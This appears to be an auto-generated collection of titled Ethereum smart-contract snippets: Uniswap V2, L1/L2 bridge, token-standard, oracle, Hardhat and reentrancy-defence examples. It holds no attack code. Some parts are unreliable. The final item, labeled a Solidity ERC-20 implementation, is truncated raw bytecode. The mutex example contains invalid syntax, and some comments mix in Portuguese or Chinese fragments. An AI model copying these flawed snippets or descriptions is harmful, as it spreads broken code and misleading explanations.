reserve1);\n    }\n```\n\n----------------------------------------\n\nTITLE: Updating Reserves and Price Accumulators in UniswapV2Pair (Solidity)\nDESCRIPTION: The _update function maintains the pair's reserves and updates price accumulators. It's called whenever tokens are deposited or withdrawn, handles overflow protection, and updates price accumulators on the first transaction of each block.\n\nLANGUAGE: solidity\nCODE:\n```\n// update reserves and, on the first call per block, price accumulators\nfunction _update(uint balance0, uint balance1, uint112 _reserve0, uint112 _reserve1) private {\n    require(balance0 <= uint112(-1) && balance1 <= uint112(-1), 'UniswapV2: OVERFLOW');\n    uint32 blockTimestamp = uint32(block.timestamp % 2**32);\n    uint32 timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired\n    if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {\n        // * never overflows, and + overflow is desired\n        price0CumulativeLast += uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) * timeElapsed;\n        price1CumulativeLast += uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) * timeElapsed;\n    }\n    reserve0 = uint112(balance0);\n    reserve1 = uint112(balance1);\n    blockTimestampLast = blockTimestamp;\n    emit Sync(reserve0, reserve1);\n}\n```\n\n----------------------------------------\n\nTITLE: Computing Function Selector Hash in Ethereum using JavaScript\nDESCRIPTION: Demonstrates how to compute the function selector (first 4 bytes of the Keccak hash) for the multiply function signature, which is necessary for constructing transaction data when interacting with smart contracts.\n\nLANGUAGE: javascript\nCODE:\n```\nweb3.sha3(\"multiply(uint256)\").substring(0, 10)\n// \"0xc6888fa1\"\n```\n\n----------------------------------------\n\nTITLE: Unique Pizza Modifier in Solidity NFT Contract\nDESCRIPTION: Custom modifier that ensures a new Pizza token is unique by comparing its name and DNA against all existing tokens. Prevents the creation of duplicate tokens.\n\nLANGUAGE: Solidity\nCODE:\n```\nmodifier isUnique(string memory _name, uint256 _dna) {\n    bool result = true;\n    for (uint256 i = 0; i < pizzas.length; i++) {\n        if (\n            keccak256(abi.encodePacked(pizzas[i].name)) ==\n            keccak256(abi.encodePacked(_name)) &&\n            pizzas[i].dna == _dna\n        ) {\n            result = false;\n        }\n    }\n    require(result, \"Pizza with such name already exists.\");\n    _;\n}\n```\n\n----------------------------------------\n\nTITLE: Finalizing ERC-20 Withdrawal with Token Transfer and Event Emission\nDESCRIPTION: Transfers ERC-20 tokens to the recipient and emits an event to signal the finalization of an L2 to L1 withdrawal, completing the bridge operation.\n\nLANGUAGE: solidity\nCODE:\n```\n// When a withdrawal is finalized on L1, the L1 Bridge transfers the funds to the withdrawer\n        // slither-disable-next-line reentrancy-events\n        IERC20(_l1Token).safeTransfer(_to, _amount);\n\n        // slither-disable-next-line reentrancy-events\n        emit ERC20WithdrawalFinalized(_l1Token, _l2Token, _from, _to, _amount, _data);\n    }\n\n\n    /*****************************\n     * Temporary - Migrating ETH *\n     *****************************/\n\n    /**\n     * @dev Adds ETH balance to the account. This is meant to allow for ETH\n     * to be migrated from an old gateway to a new gateway.\n     * NOTE: This is left for one upgrade only so we are able to receive the migrated ETH from the\n     * old contract\n     */\n    function donateETH() external payable {}\n}\n```\n\n----------------------------------------\n\nTITLE: Declaring Constants and Storage Variables in Uniswap V2 Pair Contract\nDESCRIPTION: Defines essential constants and storage variables for the Uniswap V2 pair contract, including the minimum liquidity constant to prevent division by zero and the ERC-20 transfer function selector.\n\nLANGUAGE: solidity\nCODE:\n```\nuint public constant MINIMUM_LIQUIDITY = 10**3;\n```\n\nLANGUAGE: solidity\nCODE:\n```\nbytes4 private constant SELECTOR = bytes4(keccak256(bytes('transfer(address,uint256)')));\n```\n\n----------------------------------------\n\nTITLE: Finalizing ERC20 Withdrawal from L2 to L1 in Solidity\nDESCRIPTION: This function handles finalizing ERC20 token withdrawals from L2 to L1. It verifies the request came from the L2 token bridge, updates the deposit tracking, transfers tokens to the recipient, and emits a completion event.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction finalizeERC20Withdrawal(\n    address _l1Token,\n    address _l2Token,\n    address _from,\n    address _to,\n    uint256 _amount,\n    bytes calldata _data\n) external onlyFromCrossDomainAccount(l2TokenBridge) {\n    deposits[_l1Token][_l2Token] = deposits[_l1Token][_l2Token] - _amount;\n\n    // When a withdrawal is finalized on L1, the L1 Bridge transfers the funds to the withdrawer\n    // slither-disable-next-line reentrancy-events\n    IERC20(_l1Token).safeTransfer(_to, _amount);\n\n    // slither-disable-next-line reentrancy-events\n    emit ERC20WithdrawalFinalized(_l1Token, _l2Token, _from, _to, _amount, _data);\n}\n```\n\n----------------------------------------\n\nTITLE: Retrieving ETH Price Data Using Chainlink Price Feed in Solidity\nDESCRIPTION: This smart contract demonstrates how to fetch the latest ETH/USD price from a Chainlink price feed on the Kovan network. It imports the AggregatorV3Interface, initializes the price feed with the appropriate address in the constructor, and provides a function to query the latest price data.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity ^0.6.7;\n\nimport \"@chainlink/contracts/src/v0.6/interfaces/AggregatorV3Interface.sol\";\n\ncontract PriceConsumerV3 {\n\n    AggregatorV3Interface internal priceFeed;\n\n    /**\n     * Network: Kovan\n     * Aggregator: ETH/USD\n     * Address: 0x9326BFA02ADD2366b30bacB125260Af641031331\n     */\n    constructor() public {\n        priceFeed = AggregatorV3Interface(0x9326BFA02ADD2366b30bacB125260Af641031331);\n    }\n\n    /**\n     * Returns the latest price\n     */\n    function getLatestPrice() public view returns (int) {\n        (\n            uint80 roundID,\n            int price,\n            uint startedAt,\n            uint timeStamp,\n            uint80 answeredInRound\n        ) = priceFeed.latestRoundData();\n        return price;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Initializing Node.js Project with NPM\nDESCRIPTION: Using npm init to create a new Node.js project for smart contract development. This creates a package.json file to manage dependencies.\n\nLANGUAGE: bash\nCODE:\n```\nnpm init\n```\n\n----------------------------------------\n\nTITLE: Implementing Checks-Effects-Interactions Pattern to Prevent Reentrancy in Solidity\nDESCRIPTION: This code demonstrates a secure implementation of a withdrawal function using the checks-effects-interactions pattern. It prevents reentrancy attacks by updating the contract state (setting the user's balance to 0) before making any external calls.\n\nLANGUAGE: solidity\nCODE:\n```\ncontract NoLongerAVictim {\n    function withdraw() external {\n        uint256 amount = balances[msg.sender];\n        balances[msg.sender] = 0;\n        (bool success, ) = msg.sender.call.value(amount)(\"\");\n        require(success);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Mutex Pattern to Prevent Reentrancy in Solidity\nDESCRIPTION: This smart contract demonstrates the mutex pattern to prevent reentrancy attacks. It uses a boolean lock variable that blocks recursive calls to protected functions while the original call is still being processed.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity ^0.7.0;\n\ncontract MutexPattern {\n    bool locked = false;\n    mapping(address => uint256) public balances;\n\n    modifier noReentrancy() {\n        require(!locked, \"Blocked from reentrancy.\");\n        locked = true;\n        _;\n        locked = false;\n    }\n    // This function is protected by a mutex, so reentrant calls from within `msg.sender.call` cannot call `withdraw` again.\n    //  The `return` statement evaluates to `true` but still evaluates the `locked = false` statement in the modifier\n    function withdraw(uint _amount) public payable noReentrancy returns(bool) {\n        require(balances[msg.sender] >= _amount, \"No balance to withdraw.\");\n\n        balances[msg.sender] -= _amount;\n        bool (success, ) = msg.sender.call{value: _amount}(\"\");\n        require(success);\n\n        return true;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Finalizing Deposits from L1 to L2 in L2StandardBridge\nDESCRIPTION: Function that finalizes deposits initiated on L1, minting tokens on L2. Includes validation checks to ensure the L2 token corresponds correctly to the L1 token. Only callable by the cross-domain messenger.\n\nLANGUAGE: solidity\nCODE:\n```\n    /************************************\n     * Cross-chain Function: Depositing *\n     ************************************/\n\n    /**\n     * @inheritdoc IL2ERC20Bridge\n     */\n    function finalizeDeposit(\n        address _l1Token,\n        address _l2Token,\n        address _from,\n        address _to,\n        uint256 _amount,\n        bytes calldata _data\n    ) external virtual onlyFromCrossDomainAccount(l1TokenBridge) {\n        // Check the target token is compliant and\n        // verify the deposited token on L1 matches the L2 deposited token representation here\n        if (\n            // slither-disable-next-line reentrancy-events\n            ERC165Checker.supportsInterface(_l2Token, 0x1d1d8b63) &&\n            _l1Token == IL2StandardERC20(_l2Token).l1Token()\n        ) {\n            // When a deposit is finalized, we credit the account on L2 with the same amount of\n            // tokens.\n            // slither-disable-next-line reentrancy-events\n            IL2StandardERC20(_l2Token).mint(_to, _amount);\n            // slither-disable-next-line reentrancy-events\n            emit DepositFinalized(_l1Token, _l2Token, _from, _to, _amount, _data);\n```\n\n----------------------------------------\n\nTITLE: Implementing approve Function in ERC-20\nDESCRIPTION: Defines the approve function which sets how many tokens a spender is allowed to use from the caller's account. Includes warning about potential front-running attacks when changing allowances.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. Uma solução possível para mitigar esta corrida\n     * é primeiramente reduzir a tolerância do remetente para 0 e definir o\n     * valor desejado depois:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emite um evento de {Approval}.\n     */\n    function approve(address spender, uint256 amount) external returns (bool);\n```\n\n----------------------------------------\n\nTITLE: Implementing BTC/USD Price Oracle with Tellor in Solidity\nDESCRIPTION: A simple Solidity contract that inherits from UsingTellor to retrieve the BTC/USD price. It uses the getDataBefore function to fetch price data from the Tellor oracle and decode it. The contract demonstrates the basic pattern of querying Tellor's decentralized oracle for off-chain data.\n\nLANGUAGE: solidity\nCODE:\n```\nimport \"usingtellor/contracts/UsingTellor.sol\";\n\ncontract PriceContract is UsingTellor {\n  uint256 public btcPrice;\n\n //This Contract now has access to all functions in UsingTellor\n\nconstructor(address payable _tellorAddress) UsingTellor(_tellorAddress) public {}\n\nfunction setBtcPrice() public {\n    bytes memory _b = abi.encode(\"SpotPrice\",abi.encode(\"btc\",\"usd\"));\n    bytes32 _queryId = keccak256(_b);\n\n    uint256 _timestamp;\n    bytes _value;\n\n    (_value, _timestamp) = getDataBefore(_queryId, block.timestamp - 15 minutes);\n\n    btcPrice = abi.decode(_value,(uint256));\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Essential Slither Commands for Token Security Analysis\nDESCRIPTION: A collection of Slither commands needed to follow the token integration checklist. These commands analyze ERC compliance, provide contract summaries, and test security properties of token contracts.\n\nLANGUAGE: bash\nCODE:\n```\n- slither-check-erc [target] [contractName] [optional: --erc ERC_NUMBER]\n- slither [target] --print human-summary\n- slither [target] --print contract-summary\n- slither-prop . --contract ContractName # requires configuration, and use of Echidna and Manticore\n```\n\n----------------------------------------\n\nTITLE: Completing the Test Function and Class in Solidity\nDESCRIPTION: The completion of the testLongCalldata function where it performs the call to the cache contract and verifies success. This snippet also shows the end of the CacheTest contract.\n\nLANGUAGE: solidity\nCODE:\n```\n        (_success, _callOutput) = _cacheAddr.call(_callInput);\n        assertEq(_success, true);\n        .\n        .\n        .\n    }   // testLongCalldata\n\n}        // CacheTest\n\n```\n\n----------------------------------------\n\nTITLE: Implementing _beforeTokenTransfer Hook for ERC-20 Safety Checks\nDESCRIPTION: This code defines a hook function that runs before any token transfer. It overrides the default empty implementation from OpenZeppelin's ERC-20 contract to allow for custom safety checks.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction _beforeTokenTransfer(address from, address to, uint256 amount)\n    internal virtual\n    override(ERC20)\n{\n    super._beforeTokenTransfer(from, to, amount);\n}\n```\n\n----------------------------------------\n\nTITLE: HelloWorld Solidity Smart Contract\nDESCRIPTION: A simple Solidity smart contract that stores a message and allows it to be updated. It emits an UpdatedMessages event when the message is changed, which can be listened to by frontend applications.\n\nLANGUAGE: solidity\nCODE:\n```\n// HelloWorld.sol\n\n// Specifies the version of Solidity, using semantic versioning.\n// Learn more: https://solidity.readthedocs.io/en/v0.5.10/layout-of-source-files.html#pragma\npragma solidity ^0.7.3;\n\n// Defines a contract named `HelloWorld`.\n// 一个合约是函数和数据（其状态）的集合。 Once deployed, a contract resides at a specific address on the Ethereum blockchain. Learn more: https://solidity.readthedocs.io/en/v0.5.10/structure-of-a-contract.html\ncontract HelloWorld {\n\n   //Emitted when update function is called\n   //Smart contract events are a way for your contract to communicate that something happened on the blockchain to your app front-end, which can be 'listening' for certain events and take action when they happen.\n   event UpdatedMessages(string oldStr, string newStr);\n\n   // Declares a state variable `message` of type `string`.\n   // 状态变量是其值永久存储在合约存储中的变量。 The keyword `public` makes variables accessible from outside a contract and creates a function that other contracts or clients can call to access the value.\n   string public message;\n\n   // Similar to many class-based object-oriented languages, a constructor is a special function that is only executed upon contract creation.\n   // 构造器用于初始化合约的数据。 Learn more:https://solidity.readthedocs.io/en/v0.5.10/contracts.html#constructors\n   constructor(string memory initMessage) {\n\n      // Accepts a string argument `initMessage` and sets the value into the contract's `message` storage variable).\n      message = initMessage;\n   }\n\n   // A public function that accepts a string argument and updates the `message` storage variable.\n   function update(string memory newMessage) public {\n      string memory oldMsg = message;\n      message = newMessage;\n      emit UpdatedMessages(oldMsg, newMessage);\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Token Address Validation and Sorting in Uniswap V2 Factory\nDESCRIPTION: Code that validates token addresses and sorts them to ensure deterministic pair addresses. The tokens must be different and the pair must not already exist.\n\nLANGUAGE: solidity\nCODE:\n```\n        require(tokenA != tokenB, 'UniswapV2: IDENTICAL_ADDRESSES');\n        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);\n```\n\n----------------------------------------\n\nTITLE: Analyzing EVM Storage Access and Proxy Setup in Ethereum Contract\nDESCRIPTION: This code retrieves an address from Storage[3], masks it to ensure it's a valid 160-bit Ethereum address, and prepares for a delegate call to that address. This is part of the proxy pattern implementation.\n\nLANGUAGE: EVM Bytecode\nCODE:\n```\n7C | JUMPDEST     |                      \n7D | PUSH1 0x00   | 0x00                 \n7F | PUSH2 0x009d | 0x9D 0x00            \n82 | PUSH1 0x03   | 0x03 0x9D 0x00       \n84 | SLOAD        | Storage[3] 0x9D 0x00\n```\n\n----------------------------------------\n\nTITLE: Implementing safeTransferFrom Method in Vyper ERC-721\nDESCRIPTION: This method safely transfers NFT ownership by checking if the recipient is a contract and, if so, whether it can receive ERC-721 tokens. It includes the basic transfer functionality while adding additional safety checks.\n\nLANGUAGE: vyper\nCODE:\n```\n@external\ndef safeTransferFrom(\n        _from: address,\n        _to: address,\n        _tokenId: uint256,\n        _data: Bytes[1024]=b\"\"\n    ):\n    \"\"\"\n    @dev Transfers the ownership of an NFT from one address to another address.\n         Throws unless `msg.sender` is the current owner, an authorized operator, or the\n         approved address for this NFT.\n         Throws if `_from` is not the current owner.\n         Throws if `_to` is the zero address.\n         Throws if `_tokenId` is not a valid NFT.\n         If `_to` is a smart contract, it calls `onERC721Received` on `_to` and throws if\n         the return value is not `bytes4(keccak256(\"onERC721Received(address,address,uint256,bytes)\"))`.\n         NOTE: bytes4 is represented by bytes32 with padding\n    @param _from The current owner of the NFT.\n    @param _to The new owner.\n    @param _tokenId The NFT to transfer.\n    @param _data Additional data with no specified format, sent in call to `_to`.\n    \"\"\"\n    self._transferFrom(_from, _to, _tokenId, msg.sender)\n```\n\n----------------------------------------\n\nTITLE: Defining Uniswap Pair Contract References and Token Addresses\nDESCRIPTION: Stores references to the factory contract that created this pair and the addresses of the two ERC-20 tokens that can be exchanged through this pair.\n\nLANGUAGE: solidity\nCODE:\n```\naddress public factory;\n```\n\nLANGUAGE: solidity\nCODE:\n```\naddress public token0;\naddress public token1;\n```\n\n----------------------------------------\n\nTITLE: Implementing a Hello World Smart Contract in Solidity\nDESCRIPTION: A basic smart contract written in Solidity that stores a message and allows it to be updated. It includes a constructor to initialize the message and an update function that emits an event when the message changes.\n\nLANGUAGE: solidity\nCODE:\n```\n// Especifica a versão do Solidity usando a versão semântica.\n// Learn more: https://solidity.readthedocs.io/en/v0.5.10/layout-of-source-files.html#pragma\npragma solidity >=0.7.3;\n\n// Defines a contract named `HelloWorld`.\n// Um contrato é uma coleção de funções e dados (seu estado). Uma vez implantado, um contrato reside em um endereço específico na blockchain Ethereum. Learn more: https://solidity.readthedocs.io/en/v0.5.10/structure-of-a-contract.html\ncontract HelloWorld {\n\n   //Emitted when update function is called\n   //Smart contract events are a way for your contract to communicate that something happened on the blockchain to your app front-end, which can be 'listening' for certain events and take action when they happen.\n   event UpdatedMessages(string oldStr, string newStr);\n\n   // Declares a state variable `message` of type `string`.\n   // Variáveis de estado são variáveis cujos valores são permanentemente armazenados no armazenamento do contrato. The keyword `public` makes variables accessible from outside a contract and creates a function that other contracts or clients can call to access the value.\n   string public message;\n\n   // Similar to many class-based object-oriented languages, a constructor is a special function that is only executed upon contract creation.\n   // Os construtores são usados para inicializar os dados do contrato. Learn more:https://solidity.readthedocs.io/en/v0.5.10/contracts.html#constructors\n   constructor(string memory initMessage) {\n\n      // Accepts a string argument `initMessage` and sets the value into the contract's `message` storage variable).\n      message = initMessage;\n   }\n\n   // A public function that accepts a string argument and updates the `message` storage variable.\n   function update(string memory newMessage) public {\n      string memory oldMsg = message;\n      message = newMessage;\n      emit UpdatedMessages(oldMsg, newMessage);\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Library Functions in Uniswap V2 Router\nDESCRIPTION: Proxy functions that call the UniswapV2Library implementation for various calculations like price quotes and amount conversion. These functions provide direct access to the library utilities from the router contract.\n\nLANGUAGE: solidity\nCODE:\n```\n// **** LIBRARY FUNCTIONS ****\nfunction quote(uint amountA, uint reserveA, uint reserveB) public pure virtual override returns (uint amountB) {\n    return UniswapV2Library.quote(amountA, reserveA, reserveB);\n}\n\nfunction getAmountOut(uint amountIn, uint reserveIn, uint reserveOut)\n    public\n    pure\n    virtual\n    override\n    returns (uint amountOut)\n{\n    return UniswapV2Library.getAmountOut(amountIn, reserveIn, reserveOut);\n}\n\nfunction getAmountIn(uint amountOut, uint reserveIn, uint reserveOut)\n    public\n    pure\n    virtual\n    override\n    returns (uint amountIn)\n{\n    return UniswapV2Library.getAmountIn(amountOut, reserveIn, reserveOut);\n}\n\nfunction getAmountsOut(uint amountIn, address[] memory path)\n    public\n    view\n    virtual\n    override\n    returns (uint[] memory amounts)\n{\n    return UniswapV2Library.getAmountsOut(factory, amountIn, path);\n}\n\nfunction getAmountsIn(uint amountOut, address[] memory path)\n    public\n    view\n    virtual\n    override\n    returns (uint[] memory amounts)\n{\n    return UniswapV2Library.getAmountsIn(factory, amountOut, path);\n}\n}\n```\n\n----------------------------------------\n\nTITLE: Minting Liquidity Tokens in Uniswap V2 (Solidity)\nDESCRIPTION: Function that mints liquidity tokens when a provider adds liquidity to the pool. It calculates the appropriate amount of tokens based on reserves and handles special cases like first-time deposits by permanently locking a minimum amount of liquidity.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction mint(address to) external lock returns (uint liquidity) {\n```\n\nLANGUAGE: solidity\nCODE:\n```\n(uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n```\n\nLANGUAGE: solidity\nCODE:\n```\nuint balance0 = IERC20(token0).balanceOf(address(this));\nuint balance1 = IERC20(token1).balanceOf(address(this));\nuint amount0 = balance0.sub(_reserve0);\nuint amount1 = balance1.sub(_reserve1);\n```\n\nLANGUAGE: solidity\nCODE:\n```\nbool feeOn = _mintFee(_reserve0, _reserve1);\n```\n\nLANGUAGE: solidity\nCODE:\n```\nuint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee\nif (_totalSupply == 0) {\n    liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY);\n   _mint(address(0), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens\n```\n\nLANGUAGE: solidity\nCODE:\n```\n} else {\n    liquidity = Math.min(amount0.mul(_totalSupply) / _reserve0, amount1.mul(_totalSupply) / _reserve1);\n```\n\nLANGUAGE: solidity\nCODE:\n```\n}\nrequire(liquidity > 0, 'UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED');\n_mint(to, liquidity);\n```\n\nLANGUAGE: solidity\nCODE:\n```\n_update(balance0, balance1, _reserve0, _reserve1);\nif (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date\nemit Mint(msg.sender, amount0, amount1);\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Hardhat for Ethereum Development\nDESCRIPTION: Hardhat configuration file that sets up the Solidity compiler version, defines network connections including Goerli testnet, and loads environment variables for API access and private key.\n\nLANGUAGE: javascript\nCODE:\n```\nrequire('dotenv').config();\n\nrequire(\"@nomiclabs/hardhat-ethers\");\nconst { API_URL, PRIVATE_KEY } = process.env;\n\n/**\n* @type import('hardhat/config').HardhatUserConfig\n*/\nmodule.exports = {\n   solidity: \"0.7.3\",\n   defaultNetwork: \"goerli\",\n   networks: {\n      hardhat: {},\n      goerli: {\n         url: API_URL,\n         accounts: [`0x${PRIVATE_KEY}`]\n      }\n   },\n}\n```\n\n----------------------------------------\n\nTITLE: Getting Total Underlying Assets in ERC-4626 Vault\nDESCRIPTION: The totalAssets function returns the total amount of underlying assets currently held by the vault.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction totalAssets() public view returns (uint256)\n```\n\n----------------------------------------\n\nTITLE: Reading Data from an Ethereum Smart Contract using Ethers.js\nDESCRIPTION: Demonstrates how to read the message stored in a smart contract by calling its function asynchronously and displaying the result in the console.\n\nLANGUAGE: javascript\nCODE:\n```\n// interact.js\n\n// ...\n\nasync function main() {\n  const message = await helloWorldContract.message()\n  console.log(\"The message is: \" + message)\n}\nmain()\n```\n\n----------------------------------------\n\nTITLE: Redeeming Shares from ERC-4626 Vault\nDESCRIPTION: This method redeems a specified amount of shares from the owner and sends the corresponding amount of underlying assets from the vault to the receiver.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction redeem(uint256 shares, address receiver, address owner) public returns (uint256 assets)\n```\n\n----------------------------------------\n\nTITLE: Reentrancy Lock Modifier in Uniswap V2\nDESCRIPTION: Defines a function modifier that prevents reentrancy attacks by ensuring functions cannot be called while they are already executing.\n\nLANGUAGE: solidity\nCODE:\n```\nmodifier lock() {\n    require(unlocked == 1, 'UniswapV2: LOCKED');\n    unlocked = 0;\n    _;\n    unlocked = 1;\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing _transfer Function in ERC-20 Solidity Contract\nDESCRIPTION: The internal _transfer function moves tokens from one address to another. It requires valid sender and recipient addresses and sufficient balance from the sender. This function is the core of both transfer and transferFrom operations.\n\nLANGUAGE: solidity\nCODE:\n```\n/**\n * @dev Moves tokens `amount` from `sender` to `recipient`.\n *\n * This is internal function is equivalent to {transfer}, and can be used to\n * e.g. implement automatic token fees, slashing mechanisms, etc.\n *\n * Emits a {Transfer} event.\n *\n * Requirements:\n *\n * - `sender` cannot be the zero address.\n * - `recipient` cannot be the zero address.\n * - `sender` must have a balance of at least `amount`.\n */\nfunction _transfer(address sender, address recipient, uint256 amount) internal virtual {\n```\n\n----------------------------------------\n\nTITLE: Implementing ERC-20 Token Contract in Solidity\nDESCRIPTION: A complete Solidity implementation of an ERC-20 token contract that includes all required functions such as transfer, approve, allowance, balanceOf, totalSupply, and name/symbol getters. The token is initialized with the name 'Basic', symbol 'BSC', and 18 decimals (0x12).\n\nLANGUAGE: solidity\nCODE:\n```\n60806040523480156200001157600080fd5b506040516200153938038062001539833981810160405260208110156200003757600080fd5b81019080805190602001909291905050506040518060400160405280600581526020017f42617369630000000000000000000000000000000000000000000000000000008152506040518060400160405280600381526020017f42534300000000000000000000000000000000000000000000000000000000008152508160039080519060200190620000cc92919062000389565b508060049080519060200190620000e592919062000389565b506012600560006101000a81548160ff021916908360ff16021790555050506200011633826200011d60201b60201c565b5062000438565b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415620001c1576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601f8152602001807f45524332303a206d696e7420746f20746865207a65726f20616464726573730081525060200191505060405180910390fd5b620001d560008383620002fb60201b60201c565b620001f1816002546200030060201b62000f2d1790919060201c565b6002819055506200024f816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546200030060201b62000f2d1790919060201c565b6000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff16600073ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a35050565b505050565b6000808284019050838110156200037f576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f536166654d6174683a206164646974696f6e206f766572666c6f77000000000081525060200191505060405180910390fd5b8091505092915050565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f10620003cc57805160ff1916838001178555620003fd565b82800160010185558215620003fd579182015b82811115620003fc578251825591602001919060010190620003df565b5b5090506200040c919062000410565b5090565b6200043591905b808211156200043157600081600090555060010162000417565b5090565b90565b6110f180620004486000396000f3fe608060405234801561001057600080fd5b50600436106100a95760003560e01c80633950935111610071578063395093511461025f57806370a08231146102c557806395d89b411461031d578063a457c2d7146103a0578063a9059cbb14610406578063dd62ed3e1461046c576100a9565b806306fdde03146100ae578063095ea7b31461013157806318160ddd1461019757806323b872dd146101b5578063313ce5671461023b575b600080fd5b6100b66104e4565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100f65780820151818401526020810190506100db565b50505050905090810190601f1680156101235780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b61017d6004803603604081101561014757600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610586565b604051808215151515815260200191505060405180910390f35b61019f6105a4565b6040518082815260200191505060405180910390f35b610221600480360360608110156101cb57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506105ae565b604051808215151515815260200191505060405180910390f35b610243610687565b604051808260ff1660ff16815260200191505060405180910390f35b6102ab6004803603604081101561027557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061069e565b604051808215151515815260200191505060405180910390f35b610307600480360360208110156102db57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610751565b6040518082815260200191505060405180910390f35b610325610799565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561036557808201518184015260208101905061034a565b50505050905090810190601f1680156103925780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6103ec600480360360408110156103b657600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061083b565b604051808215151515815260200191505060405180910390f35b6104526004803603604081101561041c57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610908565b604051808215151515815260200191505060405180910390f35b6104ce6004803603604081101561048257600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610926565b6040518082815260200191505060405180910390f35b606060038054600181600116156101000203166002900480601f01602080910402602001604051908101604052809291908181526020018280546001816001161561010002031660029004801561057c5780601f106105515761010080835404028352916020019161057c565b820191906000526020600020905b81548152906001019060200180831161055f57829003601f168201915b5050505050905090565b600061059a6105936109ad565b84846109b5565b6001905092915050565b6000600254905090565b60006105bb848484610bac565b61067c846105c76109ad565b6106778560405180606001604052806028815260200161102660289139600160008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600061062d6109ad565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e6d9092919063ffffffff16565b6109b5565b600190509392505050565b6000600560009054906101000a900460ff16905090565b60006107476106ab6109ad565b8461074285600160006106bc6109ad565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610f2d90919063ffffffff16565b6109b5565b6001905092915050565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b606060048054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156108315780601f1061080657610100808354040283529160200191610831565b820191906000526020600020905b81548152906001019060200180831161081457829003601f168201915b5050505050905090565b60006108fe6108486109ad565b846108f98560405180606001604052806025815260200161109760259139600160006108726109ad565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e6d9092919063ffffffff16565b6109b5565b6001905092915050565b600061091c6109156109ad565b8484610bac565b6001905092915050565b6000600160008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b600033905090565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610a3b576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260248152602001806110736024913960400191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273fffffff